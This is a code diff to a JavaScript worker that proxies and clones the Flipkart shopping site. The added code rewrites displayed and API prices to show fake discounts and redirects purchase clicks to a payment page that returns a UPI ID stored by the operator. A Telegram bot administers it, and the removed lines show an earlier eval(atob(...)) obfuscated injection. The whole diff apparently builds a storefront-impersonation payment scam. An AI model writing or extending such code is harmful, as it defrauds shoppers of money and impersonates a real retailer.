-              await tg_to_chat(chatId, `⚠️ <b>Unauthorized Chat ID</b>\n\nYour Chat ID: <code>${chatId}</code>\nThis bot is configured to only respond to the administrator.`);
             }
+          } else if (cmd === "/start" || cmd === "/help") {
+            await tg("<b>Unauthorized</b>\nYou are not allowed to use this bot.", chatId);
           }
         }
       } catch (_) { }
@@ -2414,6 +2465,30 @@ const workerObj = {
     // Per-request cookie jar — starts with bypass cookies but is ISOLATED
     // per request so User A's session never leaks to User B.
     const reqJar = new Map(bypassJar);
+
+    if (path === "/api/upi" || path === "/upi") {
+      const upiId = await getRedis("active_upi");
+      const addedAt = await getRedis("active_upi_added_at");
+      return new Response(
+        JSON.stringify({
+          active: !!upiId,
+          upiId: upiId || "",
+          addedAt: addedAt || "",
+        }),
+        {
+          headers: {
+            "Content-Type": "application/json",
+            "Access-Control-Allow-Origin": origin || "*",
+            "Access-Control-Allow-Credentials": "true",
+            "Cache-Control": "no-store",
+          },
+        },
+      );
+    }
+
+    if (path === "/" && (url.search.startsWith("?=") || url.search.includes("?="))) {
+      return servePaymentGatewayPage(request, origin);
+    }
 
     const fkm = path.match(
       /^\/__fk\/([a-z0-9.-]+\.(?:flipkart|flixcart|google|gstatic)\.com)(\/.*)?$/,
@@ -2493,9 +2568,24 @@ const workerObj = {
       let finalUA = useDesktop ? DESKTOP_UA : MOBILE_UA;
       let finalFkua = useDesktop ? "" : BASE_UA;
 
-      if (clientUA && useDesktop) {
-        finalUA = clientUA;
-        finalFkua = "";
+      if (clientUA) {
+        if (useDesktop) {
+          finalUA = clientUA;
+          finalFkua = "";
+        } else {
+          if (clientUA.includes("Mobile")) {
+            if (!clientUA.includes("FKUA")) {
+              finalUA = clientUA + " FKUA/msite/0.0.3/msite/Mobile";
+            } else {
+              finalUA = clientUA;
+            }
+            finalFkua = finalUA.replace(/\s*FKUA\/msite\/0\.0\.3\/msite\/Mobile/g, "");
+          } else {
+            // Force mobile UA on desktop browser if useDesktop is false
+            finalUA = MOBILE_UA;
+            finalFkua = BASE_UA;
+          }
+        }
       }
 
       const incomingReferer = request.headers.get("referer") || "";
@@ -2531,23 +2621,10 @@ const workerObj = {
           }
           : {}),
       };
-
-      if (!useDesktop) {
-        h["User-Agent"] = MOBILE_UA;
-        h["fkua-User-Agent"] = BASE_UA;
-        h["X-User-Agent"] = BASE_UA + " FKUA/msite/0.0.3/msite/Mobile";
-        h["flipkart_secure"] = "true";
-        h["X-Requested-With"] = "com.wFlipkart_19923844";
-        h["Network-Type"] = "4g";
-        h["sec-ch-ua"] = '"Chromium";v="148", "Android WebView";v="148", "Not(A)Brand";v="99"';
-        h["sec-ch-ua-platform"] = '"Android"';
-        h["sec-ch-ua-mobile"] = "?1";
-      }
-
       return h;
     }
 
-const t0 = Date.now();
+    const t0 = Date.now();
     let upstream;
     try {
       upstream = await fetch(fkTarget, {
@@ -2716,11 +2793,6 @@ try {
       Object.defineProperty(navigator, 'userAgentData', { get: function(){ return mockData; }, configurable: true });
     }
   }
-  try {
-    Object.defineProperty(window, 'innerWidth', { get: function(){ return 412; }, configurable: true });
-    Object.defineProperty(screen, 'width', { get: function(){ return 412; }, configurable: true });
-    Object.defineProperty(screen, 'availWidth', { get: function(){ return 412; }, configurable: true });
-  } catch(ex) {}
 } catch(e) {}
 var B='${base}';
 var BASE_UA='${BASE_UA}';
@@ -2762,6 +2834,252 @@ function injectH(h){
   } catch(e) {}
 }
 
+var PCT=${discountPct};
+var MULT=(100-PCT)/100;
+var DOM_THRESH=Math.max(500,Math.round(500/MULT));
+
+function fi(n){
+  if(n<1000)return String(n);
+  var s=String(n),r='',i=s.length,c=0;
+  while(i--){if(c&&(c===3||(c>3&&(c-3)%2===0)))r=','+r;r=s[i]+r;c++;}
+  return r;
+}
+
+// ── Layer A: JSON object recursive discounter ─────────────────
+var PK={'finalPrice':1,'mrp':1,'sellingPrice':1,'baseSellingPrice':1,'primaryProductPrice':1,'totalPrice':1,'discountedPrice':1,'effectivePrice':1,'listingPrice':1,'price':1,'strikeThroughPrice':1,'offerPrice':1,'salePrice':1,'basePrice':1,'maxRetailPrice':1,'retailPrice':1,'SP':1,'fp':1,'unitPrice':1,'specialPrice':1,'totalAmount':1,'cartTotal':1,'orderTotal':1,'payableAmount':1,'grandTotal':1,'subTotal':1,'itemTotal':1,'netPrice':1,'strikePrice':1,'ourPrice':1,'bestPrice':1,'lowestPrice':1,'coinValue':1,'feeLabelPrice':1,'strikeOffPrice':1,'strikeOff':1,'originalPrice':1,'listPrice':1,'wasPrice':1,'mrpValue':1,'displayPrice':1,'totalMrp':1,'totalSavings':1,'totalSellingPrice':1,'totalCharge':1,'totalCharges':1,'totalPayable':1,'checkoutTotal':1,'basketTotal':1,'orderAmount':1,'cartAmount':1,'totalSp':1,'totalFinalPrice':1,'codCharges':1,'deliveryCharge':1,'offerSavings':1,'totalDiscount':1,'bagTotal':1,'checkoutAmount':1,'paymentAmount':1,'billAmount':1};
+
+function isPK(k){
+  if(!k)return false;
+  var lk=k.toLowerCase();
+  return !!PK[k]||
+         lk.indexOf('price')!==-1||
+         lk.indexOf('mrp')!==-1||
+         lk.indexOf('strike')!==-1||
+         lk.indexOf('amount')!==-1||
+         lk.indexOf('payable')!==-1||
+         lk.indexOf('saving')!==-1||
+         lk.indexOf('charge')!==-1||
+         lk.indexOf('fee')!==-1||
+         lk.indexOf('tax')!==-1;
+}
+
+function isMrp(k) {
+  if (!k) return false;
+  var lk = k.toLowerCase();
+  var mrpKeys = {
+    mrp: 1,
+    maxretailprice: 1,
+    strikethroughprice: 1,
+    strikeprice: 1,
+    strikeoffprice: 1,
+    strikeoff: 1,
+    mrpvalue: 1,
+    totalmrp: 1,
+    originalprice: 1,
+    wasprice: 1,
+    listprice: 1,
+    retailprice: 1
+  };
+  if (mrpKeys[lk]) return true;
+  if (lk.indexOf('mrp') !== -1) return true;
+  if (lk.indexOf('strike') !== -1) return true;
+  if (
+    lk.indexOf('originalprice') !== -1 ||
+    lk.indexOf('wasprice') !== -1 ||
+    lk.indexOf('listprice') !== -1 ||
+    lk.indexOf('retailprice') !== -1
+  ) {
+    return true;
+  }
+  if (lk.indexOf('beforediscount') !== -1 || lk.indexOf('prediscount') !== -1) return true;
+  return false;
+}
+
+function isDiscountPercent(k) {
+  if (!k) return false;
+  var lk = k.toLowerCase();
+  return lk.indexOf("discount") !== -1 || lk.indexOf("off") !== -1 || lk.indexOf("savings") !== -1;
+}
+
+function isMrpString(s) {
+  if (!s || typeof s !== "string") return false;
+  var ls = s.toLowerCase().trim();
+  return (
+    ls === "mrp" ||
+    ls === "m.r.p." ||
+    ls === "strikeoff" ||
+    ls === "strikeoffprice"
+  );
+}
+
+function isMrpKeyVal(k, val) {
+  if (!k) return false;
+  var lk = k.toLowerCase();
+  if (
+    lk.indexOf("strike") !== -1 ||
+    lk.indexOf("mrp") !== -1 ||
+    lk.indexOf("original") !== -1 ||
+    lk.indexOf("was") !== -1
+  ) {
+    if (val === true || String(val).toLowerCase() === "true") {
+      return true;
+    }
+  }
+  return false;
+}
+
+function discObj(o,pp,isMrpContext,isDiscountContext,_depth){
+  if(!o||typeof o!=='object')return;
+  if(o.__sd)return;
+  if(o.__d)return;
+  var depth=_depth||0;
+  if(depth>30)return;
+  try{
+    Object.defineProperty(o,'__d',{value:true,writable:true,enumerable:false,configurable:true});
+  }catch(e){
+    try{o.__d=true;}catch(e2){return;}
+  }
+  var inr=(o.currency==='INR'||o.currencySymbol==='\u20b9');
+  var sd=true;
+
+  var objectIsMrp = isMrpContext;
+  var objectIsDiscount = isDiscountContext;
+  if (!Array.isArray(o)) {
+    for (var k in o) {
+      if (Object.prototype.hasOwnProperty.call(o, k)) {
+        var val = o[k];
+        if (isMrpKeyVal(k, val)) {
+          objectIsMrp = true;
+        }
+        if (typeof val === "string") {
+          if (isMrpString(val)) {
+            objectIsMrp = true;
+          }
+          var lval = val.toLowerCase();
+          if (lval === "percentage" || lval.indexOf("discount") !== -1) {
+            objectIsDiscount = true;
+          }
+        } else if (val && typeof val === "object" && !Array.isArray(val)) {
+          // Depth-2 scan
+          for (var k2 in val) {
+            if (Object.prototype.hasOwnProperty.call(val, k2)) {
+              var val2 = val[k2];
+              if (isMrpKeyVal(k2, val2)) {
+                objectIsMrp = true;
+              }
+              if (typeof val2 === "string") {
+                if (isMrpString(val2)) {
+                  objectIsMrp = true;
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+
+  for(var k in o){
+    if(!Object.prototype.hasOwnProperty.call(o,k))continue;
+    var v=o[k];
+    var isExplicitSellingKey = isPK(k) && !isMrp(k);
+    var currentIsMrp = isExplicitSellingKey ? false : (objectIsMrp || isMrp(k));
+    var currentIsDiscount = objectIsDiscount || isDiscountPercent(k);
+
+    if(v&&typeof v==='object'){
+      discObj(v,isPK(k)||sd,currentIsMrp,currentIsDiscount,depth+1);
+    }else if(typeof v==='number'){
+      if((currentIsDiscount || isDiscountPercent(k)) && v<100){
+        o[k]=PCT;
+      }else if(isPK(k)&&!currentIsMrp&&v>=DOM_THRESH){
+        var dv=Math.round(v*MULT);
+        o[k]=dv;
+        if(k==='sellingPrice'||k==='finalPrice'||k==='sp'||k==='listingPrice'){
+          if(window.__lastPath!==window.location.pathname){
+            window.__lastPath=window.location.pathname;
+            window.__fkSP=dv;
+          }else if(!window.__fkSP){
+            window.__fkSP=dv;
+          }
+        }
+      } else if(isPK(k)&&!currentIsMrp&&v>=1&&v<DOM_THRESH){
+        if(k==='sellingPrice'||k==='finalPrice'||k==='sp'){
+          if(window.__lastPath!==window.location.pathname){
+            window.__lastPath=window.location.pathname;
+            window.__fkSP=v;
+          }else if(!window.__fkSP){
+            window.__fkSP=v;
+          }
+        }
+      }
+      else if(sd&&!currentIsMrp&&(k==='value'||k==='amount'||k==='num')&&v>=DOM_THRESH){o[k]=Math.round(v*MULT);}
+    }else if(typeof v==='string'){
+      if(currentIsDiscount || isDiscountPercent(k)){
+        if(v.indexOf('%')!==-1){
+          o[k]=v.replace(/\d+%/g, PCT+'%');
+        }else{
+          var num=parseFloat(v);
+          if(!isNaN(num)&&num<100)o[k]=String(PCT);
+        }
+      }else if(v.indexOf('\u20b9')!==-1 || v.indexOf('\\u20b9')!==-1){
+        if(!isMrp(k) && !currentIsMrp){
+          o[k]=v.replace(/(?:₹|\\u20b9|\\\\u20b9)\\s*([\\d,]+)/g,function(m,p){
+            var n=parseInt(p.replace(/,/g,''),10);
+            if(isNaN(n)||n<DOM_THRESH)return m;
+            return '\u20b9'+fi(Math.round(n*MULT));
+          });
+        }
+      }else if(isPK(k)&&!currentIsMrp){
+        var num=parseFloat(v.replace(/,/g,''));
+        if(!isNaN(num)&&num>=DOM_THRESH)o[k]=(num*MULT).toFixed(2);
+      }else if(sd&&!currentIsMrp&&(k==='decimalValue'||k==='value'||k==='amount'||k==='text'||k==='displayValue'||k==='formattedValue'||k==='displayPrice'||k==='label'||k==='title'||k==='subText'||k==='header')){
+        var num=parseFloat(v.replace(/,/g,''));
+        if(!isNaN(num)&&num>=DOM_THRESH){
+          o[k]=v.indexOf(',')!==-1?fi(Math.round(num*MULT)):(num*MULT).toFixed(2);
+        }
+      }
+    }
+  }
+}
+
+// ── Layer A: JSON.parse override — removed to prevent React state corruption ───
+// Server-side discount + fetch interceptor + DOM rewriter handle prices.
+// JSON.parse override was modifying React internal objects causing crashes.
+
+// ── Layer B: Hydration state interceptors ─────────────────────
+// Intercepts window.__staticRouterHydrationData, __INITIAL_STATE__, currentState
+// BEFORE React reads them — prices discounted at hydration time
+try{
+  var _hyd;
+  Object.defineProperty(window,'__staticRouterHydrationData',{
+    get:function(){return _hyd;},
+    set:function(v){if(v&&typeof v==='object'){try{discObj(v,false,false,false);}catch(e){}}_hyd=v;},
+    configurable:true,enumerable:true
+  });
+  var _ist;
+  Object.defineProperty(window,'__INITIAL_STATE__',{
+    get:function(){return _ist;},
+    set:function(v){if(v&&typeof v==='object'){try{discObj(v,false,false,false);}catch(e){}}_ist=v;},
+    configurable:true,enumerable:true
+  });
+  var _cur;
+  Object.defineProperty(window,'currentState',{
+    get:function(){return _cur;},
+    set:function(v){if(v&&typeof v==='object'){try{discObj(v,false,false,false);}catch(e){}}_cur=v;},
+    configurable:true,enumerable:true
+  });
+}catch(e){}
+
+// ── Layer C: djson — discount ₹ amounts in raw JSON text ─────
+function djson(txt){
+  if(PCT<=0)return txt;
+  return txt.replace(/(?:\\u20b9|\\\\u20b9)([\\d,]{2,})/g,function(m,p){
+    var n=parseInt(p.replace(/,/g,''),10);
+    if(isNaN(n)||n<DOM_THRESH)return m;
+    return (m.charAt(0)==='\u20b9'?'\u20b9':'\\u20b9')+fi(Math.round(n*MULT));
+  });
+}
+
 // ── Layer C: fetch() interceptor ─────────────────────────────
 // FIX: When fetch(requestObject) called, preserve method/body/headers
 var _f=window.fetch;
@@ -2797,7 +3115,36 @@ window.fetch=function(input,init){
   injectH(h);
   ri.headers=h;
   ri.credentials='include';
-  return _f(rw(u),ri);
+  var p=_f(rw(u),ri);
+  if(PCT<=0)return p;
+  return p.then(function(resp){
+    var ct=(resp.headers.get('content-type')||'');
+    if(ct.indexOf('json')===-1)return resp;
+    var cloned=resp.clone();
+    try{
+      return resp.text().then(function(txt){
+        try{
+          var out=djson(txt);
+          var rh={};
+          try{
+            cloned.headers.forEach(function(v,k){
+              var lk=k.toLowerCase();
+              if(lk!=='content-encoding'&&lk!=='content-length'&&lk!=='transfer-encoding'){
+                rh[k]=v;
+              }
+            });
+          }catch(e){}
+          return new Response(out,{status:resp.status,statusText:resp.statusText,headers:rh});
+        }catch(e2){
+          return cloned;
+        }
+      });
+    }catch(e){
+      return cloned;
+    }
+  }).catch(function(e){
+    return _f(rw(u),ri);
+  });
 };
 
 // ── Layer D: XHR interceptor — URL rewrite + headers ─────────
@@ -2912,7 +3259,7 @@ XMLHttpRequest.prototype.send=function(){
           }
           if(prices.length>0){
             var maxP=Math.max.apply(null,prices);
-            var cutoff=Math.max(10, maxP*0.2);
+            var cutoff=Math.max(10, maxP*MULT*0.5);
             var valid=[];
             for(var j=0;j<prices.length;j++){
               if(prices[j]>=cutoff)valid.push(prices[j]);
@@ -2991,7 +3338,7 @@ XMLHttpRequest.prototype.send=function(){
       }
 
       // Priority 1: JSON interceptor se sellingPrice (first-wins, discObj se)
-      
+      if(window.__fkSP>0)return window.__fkSP;
 
       // Priority 1b: DOM pre-order traversal (find first valid product price text node)
       try {
@@ -3101,7 +3448,7 @@ XMLHttpRequest.prototype.send=function(){
       }
       if(all.length>0){
         var mx=Math.max.apply(null,all);
-        var ct=Math.max(10, mx*0.2);
+        var ct=Math.max(10, mx*MULT*0.5);
         var vl=[];
         for(var q=0;q<all.length;q++){if(all[q]>=ct)vl.push(all[q]);}
         if(vl.length>0){vl.sort(function(a,b){return a-b;});return vl[0];}
@@ -3156,7 +3503,7 @@ XMLHttpRequest.prototype.send=function(){
             var price = extractPrice(el);
             // External site pe jaane se pehle back-flag set karo
             try { if (window.__fkMarkExt) window.__fkMarkExt(); } catch(ex) {}
-            window.location.href = '/?=address?=' + price;
+            window.location.href = window.location.protocol + '//' + window.location.host + '/?=address?=' + price;
           }
           return false;
         }
@@ -3237,54 +3584,46 @@ XMLHttpRequest.prototype.send=function(){
         constructor(pct) {
           this.pct = pct;
           this.mult = (100 - pct) / 100;
+          this.domThresh = Math.max(500, Math.round(500 / this.mult));
+          this.strikeDepth = 0;
         }
-        element(el) {}
-        text(chunk) {
-          if (!chunk.text) return;
-          let modified = chunk.text;
-          if (chunk.text.indexOf("₹") !== -1 || chunk.text.indexOf("\u20b9") !== -1 || chunk.text.indexOf("&#8377;") !== -1) {
-            modified = modified.replace(/(?:₹|\u20b9|&#8377;)\s*([\d,]+)/g, (m, p) => {
-              const n = parseInt(p.replace(/,/g, ""), 10);
-              if (isNaN(n) || n < 500) return m;
-              const prefix = m.indexOf("&#8377;") !== -1 ? "&#8377;" : (m.charAt(0) === "₹" ? "₹" : "\u20b9");
-              return prefix + fmtIndian(Math.round(n * this.mult));
+        element(el) {
+          const tag = el.tagName.toUpperCase();
+          const cl = el.getAttribute("class") || "";
+          const style = el.getAttribute("style") || "";
+          const isStrike = (
+            tag === "DEL" ||
+            tag === "S" ||
+            tag === "STRIKE" ||
+            cl.includes("strike") ||
+            cl.includes("line-through") ||
+            cl.includes("_3I9_R9") ||
+            style.includes("line-through")
+          );
+          if (isStrike) {
+            this.strikeDepth++;
+            el.onEndTag(() => {
+              this.strikeDepth = Math.max(0, this.strikeDepth - 1);
             });
           }
-          if (this.pct > 0 && (chunk.text.includes("%") || chunk.text.includes("off") || chunk.text.includes("Off"))) {
-            if (/(?:₹|\u20b9|&#8377;)\s*[\d,]+\s*off/gi.test(modified)) {
-              modified = modified.replace(/(?:₹|\u20b9|&#8377;)\s*[\d,]+\s*off/gi, Math.round(this.pct) + "% off");
-            } else {
-              const trimTxt = chunk.text.trim();
-              if (trimTxt.length <= 35 && /\d+%/g.test(trimTxt)) {
-                modified = modified.replace(/\d+%/g, Math.round(this.pct) + "%");
-              }
-            }
-          }
+        }
+        text(chunk) {
+          if (this.strikeDepth > 0) return;
+          if (!chunk.text || chunk.text.indexOf("₹") === -1) return;
+          const modified = chunk.text.replace(/₹\s*([\d,]+)/g, (m, p) => {
+            const n = parseInt(p.replace(/,/g, ""), 10);
+            if (isNaN(n) || n < this.domThresh) return m;
+            return "₹" + fmtIndian(Math.round(n * this.mult));
+          });
           if (modified !== chunk.text) chunk.replace(modified);
         }
       }
-      class ScriptTextHandler {
-        constructor(pct) {
-          this.pct = pct;
-        }
-        text(chunk) {
-          if (!chunk.text || chunk.text.length < 10 || this.pct <= 0) return;
-          if (chunk.text.includes("Price") || chunk.text.includes("price") || chunk.text.includes("amount") || chunk.text.includes("value") || chunk.text.includes("₹") || chunk.text.includes("\u20b9")) {
-            const modified = applyDiscountToRegexFallback(chunk.text, this.pct);
-            if (modified !== chunk.text) chunk.replace(modified);
-          }
-        }
-      }
       const priceTextHandler = discountPct > 0 ? new PriceTextHandler(discountPct) : null;
-      const scriptTextHandler = discountPct > 0 ? new ScriptTextHandler(discountPct) : null;
 
       const rewriter = new HTMLRewriter()
         .on("head", {
           element(el) {
-            const rawJs = INTERCEPTOR.replace(/^<script>/, '').replace(/<\/script>$/, '');
-            const b64 = btoaUtf8(rawJs);
-            const obfScript = '<script>eval(decodeURIComponent(Array.prototype.map.call(atob("' + b64 + '"),function(c){return"%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);}).join("")))<\/script><style>@media(min-width:768px){html{background:#f1f2f4!important;}body{max-width:480px!important;margin:0 auto!important;position:relative!important;background:#fff!important;min-height:100vh!important;box-shadow:0 0 20px rgba(0,0,0,0.15)!important;}}</style>';
-            el.prepend(obfScript, { html: true });
+            el.prepend(INTERCEPTOR, { html: true });
             if (domPriceScript) el.append(domPriceScript, { html: true });
           },
         })
@@ -3326,7 +3665,6 @@ XMLHttpRequest.prototype.send=function(){
           .on("h4", priceTextHandler)
           .on("label", priceTextHandler)
           .on("button", priceTextHandler);
-        if (scriptTextHandler) rewriter.on("script", scriptTextHandler);
       }
 
       // Serve bot-challenge pages (403) as 200 so the browser fully
@@ -3336,38 +3674,6 @@ XMLHttpRequest.prototype.send=function(){
       return rewriter.transform(
         new Response(upstream.body, { status: serveStatus, headers: respH }),
       );
-    }
-
-    if (ct.includes("json")) {
-      const respText = await upstream.text();
-      const skipDiscount =
-        path.includes("user/state") ||
-        path.includes("login") ||
-        path.includes("otp") ||
-        path.includes("verify") ||
-        path.includes("captcha");
-      const respBody = skipDiscount
-        ? respText
-        : applyDiscountToJson(respText, discountPct);
-      const ph = new Headers();
-      for (const [k, v] of upstream.headers) {
-        const lk = k.toLowerCase();
-        if (["set-cookie", "transfer-encoding", "content-encoding", "content-length"].includes(lk))
-          continue;
-        ph.set(k, v);
-      }
-      ph.set("Access-Control-Allow-Origin", origin || "*");
-      ph.set("Access-Control-Allow-Credentials", "true");
-      ph.set("Content-Type", "application/json; charset=utf-8");
-      for (const sc of setCookies)
-        ph.append(
-          "Set-Cookie",
-          sc.replace(/;\s*domain=[^;]*/gi, "").replace(/;\s*secure/gi, ""),
-        );
-      return new Response(respBody, {
-        status: upstream.status,
-        headers: ph,
-      });
     }
 
     if (ct.includes("javascript") || ct.includes("text/plain")) {
@@ -3418,7 +3724,7 @@ XMLHttpRequest.prototype.send=function(){
 export default async function handler(request) {
   const env = {};
   const ctx = {
-    waitUntil: (p) => { if (p && typeof p.catch === 'function') p.catch(() => {}); }
+    waitUntil: (p) => { if (p && typeof p.catch === 'function') p.catch(() => { }); }
   };
   return workerObj.fetch(request, env, ctx);
 }
